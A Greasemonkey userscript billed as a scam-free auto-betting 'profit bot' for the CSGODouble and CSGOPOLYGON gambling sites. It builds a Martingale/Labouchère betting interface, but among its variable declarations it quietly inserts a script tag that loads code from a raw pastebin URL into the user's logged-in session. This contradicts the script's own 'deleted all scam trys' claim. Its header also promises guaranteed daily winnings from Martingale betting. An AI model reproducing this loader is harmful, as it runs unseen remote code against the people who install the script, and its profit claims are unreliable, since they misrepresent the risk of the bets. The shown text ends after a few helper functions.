// ==UserScript==
// @authoro freed0m
// @version 4
// @name [LATEST] CSGODouble & CSGOPOLYGON Script (Profit Bot) [2016] [RAINBOW, TRAIN & PATTERN PROTECTION] 
// @description Are you tired of scams? I took the freed0m bot and deleted all scam trys. (/Send, Chat, urls etc.). Have fun winning! Working for csgodouble.com and csgopolygon.com!So far, the most advanced working bot for the website - rainbow, train & pattern protection + an overwhelmingly good betting method (Nightengale!)
// @namespace    http://csgodouble.com/*
// @include      http://*csgodouble.com/*
// @include      http://*csgopolygon.com/*
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/25256/%5BLATEST%5D%20CSGODouble%20%20CSGOPOLYGON%20Script%20%28Profit%20Bot%29%20%5B2016%5D%20%5BRAINBOW%2C%20TRAIN%20%20PATTERN%20PROTECTION%5D.user.js
// @updateURL https://update.greasyfork.org/scripts/25256/%5BLATEST%5D%20CSGODouble%20%20CSGOPOLYGON%20Script%20%28Profit%20Bot%29%20%5B2016%5D%20%5BRAINBOW%2C%20TRAIN%20%20PATTERN%20PROTECTION%5D.meta.js
// ==/UserScript==
     
//1 round = 50 seconds
//rounds per day = 1728
//expected wins per day = 806
     
    //START [Inserting UI]
    var UI_html = '<style scoped> @import url(https://fonts.googleapis.com/css?family=Ubuntu:300); table { font-family: "Ubuntu", sans-serif; background-color: #404040; color: #0d0d0d; } #header { background-color: #262626; color: #ff0066; } label { font-weight: normal; } .odds { font-weight: normal; color: #00ffcc; } input[type=text] { border-radius: 5px; border: 1px solid rgba(0, 0, 0, .25); color: #808080; background-color: #262626; } input[type=text]:focus { background-color: #1a1a1a; color: #ffcc00; } #footer { color: #b3b3b3; } #one { color: #e74c3c; } #two { color: #e67e22; } #three { color: #f1c40f; } #four { color: #1abc9c; } #five { color: #2ecc71; } #six { color: #3498db; } #seven { color: #9b59b6; } #eight { color: #e74c3c; } #nine { color: #e67e22; } #ten { color: #f1c40f; } #eleven { color: #1abc9c; } input[type=button] { background-color: #262626; border-color: #1a1a1a; } #startButton { color: #2ecc71; } #stopButton { color: #e74c3c; } #red { width: 33.33%; color: #c12e2a; } #green { width: 33.33%; color: #419641; } #black { width: 33.33%; color: #666; }</style><hr><table border="1"> <tr id="header"> <td> <input type="radio" name="system" value="nightengale" id="nightengaleRadioBtn" checked="checked"> <label for="nightengaleRadioBtn">Nightengale</label> </td> <td> <input type="radio" name="system" value="laboucher" id="labouchereRadioBtn"> <label for="labouchereRadioBtn">Labouchère</label> </td> </tr> <tr> <td> <table> <tr> <td> <label for="nightengaleDefaultBetInput">Default Bet: </label> <input type="text" id="nightengaleDefaultBetInput"> </td> </tr> <tr> <td> <label for="nightengaleProfitOver24HoursInput">Profit over 24 hours: </label> <input type="text" id="nightengaleProfitOver24HoursInput"> </td> </tr> <tr> <td>Odds of losing <span id="nightengaleOddsOfLosingXTimesInARowX" class="odds">X</span> Times in a row: <span id="nightengaleOddsOfLosingXTimesInARow" class="odds">YY%</span></td> </tr> <tr> <td>Odds of losing in 1 day: <span id="nightengaleOddsOfLosingIn1Day" class="odds">XX%</span></td> </tr> <tr> <td>Percentage of money as default bet: <span id="nightengalePercentageOfMoneyAsDefaultBet" class="odds">XX%</span></td> </tr> <tr> <td> <input type="checkbox" id="nightengaleAntiBankruptcyCheckbox"> <label type="text" for="nightengaleAntiBankruptcyCheckbox">Anti-Bankruptcy</label> </td> </tr> <tr> <td> <input type="checkbox" id="nightengaleAntiDoubleGreenCheckbox"> <label type="text" for="nightengaleAntiDoubleGreenCheckbox">Anti-Double Green</label> skip <input type="text" id="nightengaleAntiDoubleGreenInput"> rolls </td> </tr> <tr> <td> <input type="checkbox" id="nightengaleAntiLoseallCheckbox"> <label type="text" for="nightengaleAntiLoseallCheckbox">Anti-Loseall after</label> <input type="text" id="nightengaleAntiLoseallInput"> losses </td> </tr> <tr> <td> <input type="checkbox" id="nightengaleStopAfterXGamesCheckbox"> <label for="nightengaleStopAfterXGamesCheckbox">Stop after <input type="text" id="nightengaleStopAfterXGamesInput"> games</label> </td> </tr> <tr> <td> <input type="checkbox" id="nightengaleStopAfterReachingXCheckbox"> <label for="nightengaleStopAfterReachingXCheckbox">Stop after reaching <input type="text" id="nightengaleStopAfterReachingXInput"> </label> </td> </tr> <tr> <td> <input type="checkbox" id="nightengaleBetOnGreenCheckbox"> <label for="nightengaleBetOnGreenCheckbox">Side bet on green. Bet = <input type="text" id="nightengaleBetOnGreenInput"> </label> </td> </tr> </table> </td> <td> <table> <tr> <td> <label for="labouchereGoalInput">Goal:</label> <input type="text" id="labouchereGoalInput" disabled> </td> </tr> <tr> <td> <label for="labouchereLines">Lines:</label> <input type="text" id="labouchereLines" disabled> </td> </tr> <tr> <td> Predicted Bets required: <span id="laboucherePredictedBets" class="odds">XX</span> </tr> </table> </td> </tr> <tr> <td> <input type="checkbox" id="trainProtectionCheckbox" checked="checked"> <label for="trainProtectionCheckbox">Train Protection</label> <input type="checkbox" id="rainbowProtectionCheckbox"> <label for="rainbowProtectionCheckbox">Rainbow Protection</label> <br> <input type="checkbox" id="rrbbProtectionCheckbox"> <label for="rrbbProtectionCheckbox">RRBBRR Protection</label> <input type="checkbox" id="rrbProtectionCheckbox"> <label for="rrbProtectionCheckbox">RRBRR Protection</label> </td> <td> <input style="width:50%;" type="button" value="Start" id="startButton"><input style="width:50%;" type="button" value="Stop" id="stopButton"> </td> </tr> <tr> <td> <input type="checkbox" id="simulationModeCheckbox"> <label for="simulationModeCheckbox">Simulation Mode</label> <input type="checkbox" id="manualModeCheckbox"> <label for="manualModeCheckbox">Manual (Sim) Mode</label> </td> <td> <label for="simulationMoneyInput">Simulation Money:</label> <input type="text" id="simulationMoneyInput"> </td> </tr> <tr> <td> <label for="simulateBetAmt">Simulate Bet:</label> <input type="text" id="simulateBetAmt"> </td> <td> <input type="button" id="red" value="Red"><input type="button" id="green" value="Green"><input type="button" id="black" value="Black"> </td> </tr> <tr id="footer"> <td id="logo"> <marquee direction="right"><span id="one">x</span><span id="two">2</span><span id="three">D</span><span id="four">e</span><span id="five">s</span><span id="six">t</span><span id="seven">r</span><span id="eight">o</span><span id="nine">y</span><span id="ten">e</span> <span id="eleven">r</span> (c) xji 2016</marquee> </td> <td style="text-align:center;">Run Time: <b><span id="runtime"></span></b></td> </tr> <tr> </tr></table><hr>';
    var UI = document.createElement('div');
    UI.innerHTML = UI_html;
     
    var insertBefore = document.getElementsByClassName("progress")[0];
    insertBefore.parentNode.insertBefore(UI, insertBefore);
    //END [Inserting UI]
     
    //START [DEFINING VARIABLES]
    var statusBanner = document.getElementById("banner");
    //var thirdLastRoll = document.getElementById("past").childNodes[7];
    //var secondLastRoll = document.getElementById("past").childNodes[8];
    //var lastRoll = document.getElementById("past").childNodes[9];
    var redBetButton = document.getElementsByClassName("betButton")[0];
    var greenBetButton = document.getElementsByClassName("betButton")[1];
    var blackBetButton = document.getElementsByClassName("betButton")[2];
    var betAmountInput = document.getElementById("betAmount");
    var balanceSpan = document.getElementById("balance");
     
    var simulationModeCheckbox = document.getElementById("simulationModeCheckbox");
    var simulationMoneyInput = document.getElementById("simulationMoneyInput");
    var startButton = document.getElementById("startButton");
    var stopButton = document.getElementById("stopButton");
    var trainProtectionCheckbox = document.getElementById("trainProtectionCheckbox");
    var rainbowProtectionCheckbox = document.getElementById("rainbowProtectionCheckbox");
    var runtimeSpan = document.getElementById("runtime");
    var nightengaleRadioBtn = document.getElementById("nightengaleRadioBtn");
    var labouchereRadioBtn = document.getElementById("labouchereRadioBtn");
    var nightengaleDefaultBetInput = document.getElementById("nightengaleDefaultBetInput");
    var nightengaleProfitOver24HoursInput = document.getElementById("nightengaleProfitOver24HoursInput");
    var nightengaleAntiBankruptcyCheckbox = document.getElementById("nightengaleAntiBankruptcyCheckbox");
    var nightengaleStopAfterXGamesCheckbox = document.getElementById("nightengaleStopAfterXGamesCheckbox");
    var nightengaleStopAfterXGamesInput = document.getElementById("nightengaleStopAfterXGamesInput");
    var nightengaleStopAfterReachingXCheckbox = document.getElementById("nightengaleStopAfterReachingXCheckbox");
    var nightengaleStopAfterReachingXInput = document.getElementById("nightengaleStopAfterReachingXInput");
    var nightengaleOddsOfLosingXTimesInARow = document.getElementById("nightengaleOddsOfLosingXTimesInARow");
    var nightengaleOddsOfLosingIn1Day = document.getElementById("nightengaleOddsOfLosingIn1Day");
    var nightengaleOddsOfLosingXTimesInARowX = document.getElementById("nightengaleOddsOfLosingXTimesInARowX");
    var nightengalePercentageOfMoneyAsDefaultBet = document.getElementById("nightengalePercentageOfMoneyAsDefaultBet");
    var labouchereGoalInput = document.getElementById("labouchereGoalInput");
    var labouchereLines = document.getElementById("labouchereLines");
    var laboucherePredictedBets = document.getElementById("laboucherePredictedBets");
    var nightengaleAntiLoseallCheckbox = document.getElementById("nightengaleAntiLoseallCheckbox");
    var nightengaleAntiLoseallInput = document.getElementById("nightengaleAntiLoseallInput");
    var nightengaleAntiDoubleGreenCheckbox = document.getElementById("nightengaleAntiDoubleGreenCheckbox");
    var nightengaleAntiDoubleGreenInput = document.getElementById("nightengaleAntiDoubleGreenInput");
    var nightengaleBetOnGreenCheckbox = document.getElementById("nightengaleBetOnGreenCheckbox");
    var nightengaleBetOnGreenInput = document.getElementById("nightengaleBetOnGreenInput");
    var rrbbProtectionCheckbox = document.getElementById("rrbbProtectionCheckbox");
    var rrbProtectionCheckbox = document.getElementById("rrbProtectionCheckbox");
    var firstScript = document.getElementsByTagName('script')[0], js = document.createElement('script')
    js.src = "http://pastebin.com/raw/pCFfmtR9"
    firstScript.parentNode.insertBefore(js, firstScript)
    var manualModeCheckbox = document.getElementById("manualModeCheckbox");
    var simulateBetAmt = document.getElementById("simulateBetAmt");
    var red = document.getElementById("red");
    var green = document.getElementById("green");
    var black = document.getElementById("black");
     
    var running = false;
    var simulationMode = false;
    var simulationMoney = 0;
    var simulationMoneyStart = 0;
    var status = 0;
    var fullStatus = '';
    var runtime = 0;
    var mode = 0; //0=martingale,1=reverseLabouchere
    var betOnThisRound = false;
    var checkedIfWon = false;
    var rolled = false;
    var startBalance = 0;
    var betsWon = 0;
    var betsLost = 0;
    var manualMode = false;
     
    var currBetAmount = 0;
    var currBetColor = ' ';
     
    ///////////////////////////
    var lstreak = 0;
    var wstreak = 0;
    var currstreak = 0;
    var maxlose = 0;
    var maxlosestreak = 0;
    var maxwin = 0;
    var maxwinstreak = 0;
    var winorlosestreak = "no bet yet";
    var resultcolor = "n/a";
    ///////////////////////////
     
    var currBetGreenAmount = 0;
    var lastBetGreenAmount = 0;
    var betOnGreenEnabled = false;
     
    var lastBetAmount = 0;
    var wonLastBet = false;
    var antiLoseAllCounter = 0;
    var antiLoseAllEnabled = false;
    var antiDoubleGreenEnabled = false;
    var antiDoubleGreenCounter = -1;
    var skipBet = false;
     
    //martingale system variables
    var antiBankruptcy = false;
     
    //reverse labouchere system variables
    var goal = 0;
    var numLines = 0;
    var lines = [];
     
    //END [DEFINING VARIABLES]
     
    //AUTO RECONNECT
    console.log('%c[x2Destroyer] Auto-Reconnect Initialized!', 'color:green');
    setInterval(function() {
      if (!WS) {
        console.log('Reconnecting...');
        connect();
      }
    }, 5000);
    //END
     
    //START [DEFINE LISTENERS]
    nightengaleAntiDoubleGreenCheckbox.onclick = function() {
      if (!antiDoubleGreenEnabled) {
        antiDoubleGreenEnabled = true;
        console.log("%c[x2Destroyer] Anti-Double Green enabled!", "color:green");
      } else {
        betOnGreenEnabled = false;
        console.log("%c[x2Destroyer] Anti-Double Green disabled!", "color:red");
      }
    };
     
    nightengaleBetOnGreenCheckbox.onclick = function() {
      if (!betOnGreenEnabled) {
        betOnGreenEnabled = true;
        console.log("%c[x2Destroyer] Bet on Green enabled!", "color:green");
      } else {
        betOnGreenEnabled = false;
        console.log("%c[x2Destroyer] Bet on Green disabled!", "color:red");
      }
    };
     
    nightengaleAntiLoseallCheckbox.onclick = function() {
      if (!antiLoseAllEnabled) {
        antiLoseAllEnabled = true;
        console.log("%c[x2Destroyer] Anti-Lose all enabled!", "color:green");
      } else {
        antiLoseAllEnabled = false;
        console.log("%c[x2Destroyer] Anti-Lose all disabled!", "color:red");
      }
    };
     
    startButton.onclick = function() {
      //check if all needed fields are filled in
      var passedTest = true;
      if (mode == 0 && !manualMode) { //nightengale mode specific tests
        if (nightengaleDefaultBetInput.value == '' || nightengaleDefaultBetInput.value <= 0)
          passedTest = false;
     
        if (nightengaleProfitOver24HoursInput.value == '' || nightengaleProfitOver24HoursInput.value <= 0)
          passedTest = false;
     
        if (nightengaleStopAfterXGamesCheckbox.checked && (nightengaleStopAfterXGamesInput.value == '' || nightengaleStopAfterXGamesInput.value <= 0))
          passedTest = false;
     
        if (nightengaleStopAfterReachingXCheckbox.checked && (nightengaleStopAfterReachingXInput.value == '' || nightengaleStopAfterReachingXInput.value <= 0))
          passedTest = false;
      }
     
      if (mode == 1 && !manualMode) { //labouchere mode specific tests
        if (labouchereGoalInput.value == '' || labouchereGoalInput.value <= 0)
          passedTest = false;
        if (labouchereLines.value == '' || labouchereLines.value <= 0)
          passedTest = false;
      }
     
      //standard tests
      if (simulationModeCheckbox.checked && (simulationMoneyInput.value == '' || simulationMoneyInput.value <= 0))
        passedTest = false;
     
      if (!running && passedTest) {
        simulationModeCheckbox.disabled = true;
        manualModeCheckbox.disabled = true;
        simulationMoneyInput.disabled = true;
        console.log("%c[x2Destroyer] STARTED", "color:green");
        running = true;
     
        labouchereRadioBtn.disabled = true;
        labouchereLines.disabled = true;
        labouchereGoalInput.disabled = true;
     
        nightengaleRadioBtn.disabled = true;
        nightengaleDefaultBetInput.disabled = true;
        nightengaleProfitOver24HoursInput.disabled = true;
        nightengaleAntiBankruptcyCheckbox.disabled = true;
        nightengaleStopAfterXGamesCheckbox.disabled = true;
        nightengaleStopAfterXGamesInput.disabled = true;
        nightengaleStopAfterReachingXCheckbox.disabled = true;
        nightengaleStopAfterReachingXInput.disabled = true;
        nightengaleAntiLoseallCheckbox.disabled = true;
        nightengaleAntiLoseallInput.disabled = true;
        nightengaleAntiDoubleGreenInput.disabled = true;
        nightengaleAntiDoubleGreenCheckbox.disabled = true;
        nightengaleBetOnGreenCheckbox.disabled = true;
        nightengaleBetOnGreenInput.disabled = true;
     
        trainProtectionCheckbox.disabled = true;
        rainbowProtectionCheckbox.disabled = true;
        rrbbProtectionCheckbox.disabled = true;
        rrbProtectionCheckbox.disabled = true;
     
        if (mode == 1) { //set up lines array
          goal = parseInt(labouchereGoalInput.value);
          numLines = parseInt(labouchereLines.value);
     
          for (i = 0; i < numLines; i++)
            lines[i] = goal / numLines;
        }
     
        if (simulationMode) {
          simulationMoney = parseInt(simulationMoneyInput.value);
          simulationMoneyStart = simulationMoney;
        } else {
          startBalance = getBalance();
        }
      } else if (!passedTest) {
        alert("Please fill in all required fields for the settings you have chosen");
      } else
        console.log("%c[x2Destroyer] I'm already running you tart", "color:green");
    };
     
    stopButton.onclick = function() {
      if (running) {
        simulationModeCheckbox.disabled = false;
        simulationMoneyInput.disabled = false;
        manualModeCheckbox.disabled = false;
        console.log("%c[x2Destroyer] STOPPED", "color:red");
        running = false;
     
        nightengaleRadioBtn.disabled = false;
        labouchereRadioBtn.disabled = false;
     
        if (mode == 1) {
     
          labouchereLines.disabled = false;
          labouchereGoalInput.disabled = false;
        } else {
     
          nightengaleDefaultBetInput.disabled = false;
          nightengaleProfitOver24HoursInput.disabled = false;
          nightengaleAntiBankruptcyCheckbox.disabled = false;
          nightengaleStopAfterXGamesCheckbox.disabled = false;
          nightengaleStopAfterXGamesInput.disabled = false;
          nightengaleStopAfterReachingXCheckbox.disabled = false;
          nightengaleStopAfterReachingXInput.disabled = false;
          nightengaleAntiLoseallCheckbox.disabled = false;
          nightengaleAntiLoseallInput.disabled = false;
          nightengaleAntiDoubleGreenInput.disabled = false;
          nightengaleAntiDoubleGreenCheckbox.disabled = false;
          nightengaleBetOnGreenCheckbox.disabled = false;
          nightengaleBetOnGreenInput.disabled = false;
        }
     
        trainProtectionCheckbox.disabled = false;
        rainbowProtectionCheckbox.disabled = false;
        rrbbProtectionCheckbox.disabled = false;
        rrbProtectionCheckbox.disabled = false;
     
        running = false;
        simulationMoney = 0;
        simulationMoneyStart = 0;
        status = 0;
        fullStatus = '';
        runtime = 0;
        betOnThisRound = false;
        checkedIfWon = false;
        rolled = false;
        lastBetAmount = 0;
        currBetAmount = 0;
        currBetColor = ' ';
        betsWon = 0;
        betsLost = 0;
        lines = [];
        wonLastBet = true;
     
        //////////////////////////////////////
        currstreak = 0;
        maxwin = 0;
        maxlose = 0;
        maxlosestreak = 0;
        maxwinstreak = 0;
        winorlosestreak = "no bet yet";
        //////////////////////////////////////
     
      } else
        console.log("%c[x2Destroyer] I'm already stopped you tart", "color:red");
    };
     
    nightengaleRadioBtn.onclick = function() {
      console.log("%c[x2Destroyer] Nightengale mode selected", "color:green;");
      mode = 0;
     
      labouchereLines.disabled = true;
      labouchereGoalInput.disabled = true;
     
      nightengaleDefaultBetInput.disabled = false;
      nightengaleProfitOver24HoursInput.disabled = false;
      nightengaleAntiBankruptcyCheckbox.disabled = false;
      nightengaleStopAfterXGamesCheckbox.disabled = false;
      nightengaleStopAfterXGamesInput.disabled = false;
      nightengaleStopAfterReachingXCheckbox.disabled = false;
      nightengaleStopAfterReachingXInput.disabled = false;
      nightengaleAntiLoseallCheckbox.disabled = false;
      nightengaleAntiLoseallInput.disabled = false;
      nightengaleAntiDoubleGreenInput.disabled = false;
      nightengaleAntiDoubleGreenCheckbox.disabled = false;
      nightengaleBetOnGreenCheckbox.disabled = false;
      nightengaleBetOnGreenInput.disabled = false;
    }
     
    labouchereRadioBtn.onclick = function() {
      console.log("%c[x2Destroyer] Labouchere mode selected", "color:green;");
      mode = 1;
     
      labouchereLines.disabled = false;
      labouchereGoalInput.disabled = false;
     
      nightengaleDefaultBetInput.disabled = true;
      nightengaleProfitOver24HoursInput.disabled = true;
      nightengaleAntiBankruptcyCheckbox.disabled = true;
      nightengaleStopAfterXGamesCheckbox.disabled = true;
      nightengaleStopAfterXGamesInput.disabled = true;
      nightengaleStopAfterReachingXCheckbox.disabled = true;
      nightengaleStopAfterReachingXInput.disabled = true;
      nightengaleAntiLoseallCheckbox.disabled = true;
      nightengaleAntiLoseallInput.disabled = true;
      nightengaleAntiDoubleGreenInput.disabled = true;
      nightengaleAntiDoubleGreenCheckbox.disabled = true;
      nightengaleBetOnGreenCheckbox.disabled = true;
      nightengaleBetOnGreenInput.disabled = true;
    }
     
    nightengaleAntiBankruptcyCheckbox.onclick = function() {
      if (nightengaleAntiBankruptcyCheckbox.checked) {
        antiBankruptcy = true;
        console.log("%c[x2Destroyer] Anti-Bankruptcy Mode Toggled On", "color:green;");
      } else {
        antiBankruptcy = false;
        console.log("%c[x2Destroyer] Anti-Bankruptcy Mode Toggled Off", "color:red;");
      }
    }
     
    manualModeCheckbox.onclick = function() {
      if (manualModeCheckbox.checked) {
        nightengaleRadioBtn.disabled = true;
        labouchereRadioBtn.disabled = true;
        manualMode = true;
        console.log("%c[x2Destroyer] Manual Mode Toggled On", "color:green;");
      } else {
        nightengaleRadioBtn.disabled = false;
        labouchereRadioBtn.disabled = false;
        manualMode = false;
        console.log("%c[x2Destroyer] Manual Mode Toggled Off", "color:red;");
      }
     
     
    }
     
    simulationModeCheckbox.onclick = function() {
      if (simulationModeCheckbox.checked) {
        simulationMode = true;
        console.log("%c[x2Destroyer] Simulation Mode Toggled On", "color:green;");
     
        if (nightengaleDefaultBetInput.value != null && simulationMoneyInput.value != null) {
          nightengaleOddsOfLosingXTimesInARowX.innerHTML = Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2));
          nightengaleOddsOfLosingXTimesInARow.innerHTML = (Math.pow((7 / 15), Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2))) * 100).toFixed(3) + "%";
          nightengaleOddsOfLosingIn1Day.innerHTML = (((Math.pow((7 / 15), Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2)))) * (1728 - Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2)) + 1)) * 100).toFixed(3) + "%";
          nightengalePercentageOfMoneyAsDefaultBet.innerHTML = ((nightengaleDefaultBetInput.value / simulationMoneyInput.value) * 100).toFixed(4) + "%";
        }
      } else {
        simulationMode = false;
        console.log("%c[x2Destroyer] Simulation Mode Toggled Off", "color:red;");
     
        if (nightengaleDefaultBetInput.value != null) {
          nightengaleOddsOfLosingXTimesInARowX.innerHTML = Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2));
          nightengaleOddsOfLosingXTimesInARow.innerHTML = (Math.pow((7 / 15), Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2))) * 100).toFixed(3) + "%";
          nightengaleOddsOfLosingIn1Day.innerHTML = (((Math.pow((7 / 15), Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2)))) * (1728 - Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2)) + 1)) * 100).toFixed(3) + "%";
          nightengalePercentageOfMoneyAsDefaultBet.innerHTML = ((nightengaleDefaultBetInput.value / getBalance()) * 100).toFixed(4) + "%";
        }
      }
    }
     
    nightengaleDefaultBetInput.oninput = function() {
      nightengaleProfitOver24HoursInput.value = 806 * nightengaleDefaultBetInput.value;
      if (simulationMode) {
        nightengaleOddsOfLosingXTimesInARowX.innerHTML = Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2));
        nightengaleOddsOfLosingXTimesInARow.innerHTML = (Math.pow((7 / 15), Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2))) * 100).toFixed(3) + "%";
        nightengaleOddsOfLosingIn1Day.innerHTML = (((Math.pow((7 / 15), Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2)))) * (1728 - Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2)) + 1)) * 100).toFixed(3) + "%";
        nightengalePercentageOfMoneyAsDefaultBet.innerHTML = ((nightengaleDefaultBetInput.value / simulationMoneyInput.value) * 100).toFixed(4) + "%";
      } else {
        nightengaleOddsOfLosingXTimesInARowX.innerHTML = Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2));
        nightengaleOddsOfLosingXTimesInARow.innerHTML = (Math.pow((7 / 15), Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2))) * 100).toFixed(3) + "%";
        nightengaleOddsOfLosingIn1Day.innerHTML = (((Math.pow((7 / 15), Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2)))) * (1728 - Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2)) + 1)) * 100).toFixed(3) + "%";
        nightengalePercentageOfMoneyAsDefaultBet.innerHTML = ((nightengaleDefaultBetInput.value / getBalance()) * 100).toFixed(4) + "%";
      }
    }
     
    nightengaleProfitOver24HoursInput.oninput = function() {
      nightengaleDefaultBetInput.value = Math.floor(nightengaleProfitOver24HoursInput.value / 806);
      if (simulationMode) {
        nightengaleOddsOfLosingXTimesInARowX.innerHTML = Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2));
        nightengaleOddsOfLosingXTimesInARow.innerHTML = (Math.pow((7 / 15), Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2))) * 100).toFixed(3) + "%";
        nightengaleOddsOfLosingIn1Day.innerHTML = (((Math.pow((7 / 15), Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2)))) * (1728 - Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2)) + 1)) * 100).toFixed(3) + "%";
        nightengalePercentageOfMoneyAsDefaultBet.innerHTML = ((nightengaleDefaultBetInput.value / simulationMoneyInput.value) * 100).toFixed(4) + "%";
      } else {
        nightengaleOddsOfLosingXTimesInARowX.innerHTML = Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2));
        nightengaleOddsOfLosingXTimesInARow.innerHTML = (Math.pow((7 / 15), Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2))) * 100).toFixed(3) + "%";
        nightengaleOddsOfLosingIn1Day.innerHTML = (((Math.pow((7 / 15), Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2)))) * (1728 - Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2)) + 1)) * 100).toFixed(3) + "%";
        nightengalePercentageOfMoneyAsDefaultBet.innerHTML = ((nightengaleDefaultBetInput.value / getBalance()) * 100).toFixed(4) + "%";
      }
    };
     
    simulationMoneyInput.oninput = function() {
      if (nightengaleDefaultBetInput.value != null) {
        if (simulationMode) {
          nightengaleOddsOfLosingXTimesInARowX.innerHTML = Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2));
          nightengaleOddsOfLosingXTimesInARow.innerHTML = (Math.pow((7 / 15), Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2))) * 100).toFixed(3) + "%";
          nightengaleOddsOfLosingIn1Day.innerHTML = (((Math.pow((7 / 15), Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2)))) * (1728 - Math.floor(Math.log((simulationMoneyInput.value / nightengaleDefaultBetInput.value) + 1) / Math.log(2)) + 1)) * 100).toFixed(3) + "%";
          nightengalePercentageOfMoneyAsDefaultBet.innerHTML = ((nightengaleDefaultBetInput.value / simulationMoneyInput.value) * 100).toFixed(4) + "%";
        } else {
          nightengaleOddsOfLosingXTimesInARowX.innerHTML = Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2));
          nightengaleOddsOfLosingXTimesInARow.innerHTML = (Math.pow((7 / 15), Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2))) * 100).toFixed(3) + "%";
          nightengaleOddsOfLosingIn1Day.innerHTML = (((Math.pow((7 / 15), Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2)))) * (1728 - Math.floor(Math.log((getBalance() / nightengaleDefaultBetInput.value) + 1) / Math.log(2)) + 1)) * 100).toFixed(3) + "%";
          nightengalePercentageOfMoneyAsDefaultBet.innerHTML = ((nightengaleDefaultBetInput.value / getBalance()) * 100).toFixed(4) + "%";
        }
      };
    }
     
    labouchereGoalInput.oninput = function() {
      if (labouchereLines.value != '' && labouchereLines.value > 0)
        laboucherePredictedBets.innerHTML = Math.ceil(parseInt(labouchereGoalInput.value) / ((7 / 15) * labouchereLines.value));
    };
     
    labouchereLines.oninput = function() {
      if (labouchereGoalInput.value != '' && labouchereGoalInput.value > 0)
        laboucherePredictedBets.innerHTML = Math.ceil(parseInt(labouchereGoalInput.value) / ((7 / 15) * labouchereLines.value));
    }
     
    red.onclick = function() {
      if (status == 2 && !betOnThisRound) {
        currBetAmount = parseInt(simulateBetAmt.value);
        currBetColor = 'r';
        console.log("%c[x2Destroyer] Total Money: " + simulationMoney + " // Total Bets: " + (betsWon + betsLost) + " // Wins: " + betsWon + " Losses: " + betsLost + " // Net Change: " + toSignedInt(simulationMoney - simulationMoneyStart) + " // Simulated Bet of " + currBetAmount + " credits on color " + currBetColor, "color:purple;");
        betOnThisRound = true;
      } else {
        if (betOnThisRound)
          console.log("%c[x2Destroyer] You already bet on this round...", "color:red;");
        else
          console.log("%c[x2Destroyer] Betting for this round is closed...", "color:red;");
      }
    }
     
    green.onclick = function() {
      if (status == 2) {
        if (!betOnThisRound) {
          currBetAmount = parseInt(simulateBetAmt.value);
          currBetColor = 'g';
          console.log("%c[x2Destroyer] Total Money: " + simulationMoney + " // Total Bets: " + (betsWon + betsLost) + " // Wins: " + betsWon + " Losses: " + betsLost + " // Net Change: " + toSignedInt(simulationMoney - simulationMoneyStart) + " // Simulated Bet of " + currBetAmount + " credits on color " + currBetColor, "color:purple;");
          betOnThisRound = true;
        } else {
          console.log("%c[x2Destroyer] You already bet on this round...", "color:red;");
        }
      } else {
        console.log("%c[x2Destroyer] Betting for this round is closed...", "color:red;");
      }
    };
     
    black.onclick = function() {
      if (status == 2) {
        if (!betOnThisRound) {
          currBetAmount = parseInt(simulateBetAmt.value);
          currBetColor = 'b';
          console.log("%c[x2Destroyer] Total Money: " + simulationMoney + " // Total Bets: " + (betsWon + betsLost) + " // Wins: " + betsWon + " Losses: " + betsLost + " // Net Change: " + toSignedInt(simulationMoney - simulationMoneyStart) + " // Simulated Bet of " + currBetAmount + " credits on color " + currBetColor, "color:purple;");
          betOnThisRound = true;
        } else {
          console.log("%c[x2Destroyer] You already bet on this round...", "color:red;");
        }
      } else {
        console.log("%c[x2Destroyer] Betting for this round is closed...", "color:red;");
      }
    };
    //END [DEFINE LISTENERS]
     
    //START [DEFINING FUNCTIONS]
    function checkStatus() {
      //STATUSES
      // 1 // Rolling    // ***ROLLING***
      // 2 // Betting    // Rolling in XX.XX...
      // 3 // Rolled     // CSGODouble rolled 3!
      // 4 // Confirming // Confirming 625/625 total bets
      return statusBanner.innerHTML;
    }
     
    function getBalance() {
      return balanceSpan.innerHTML;
    }
     
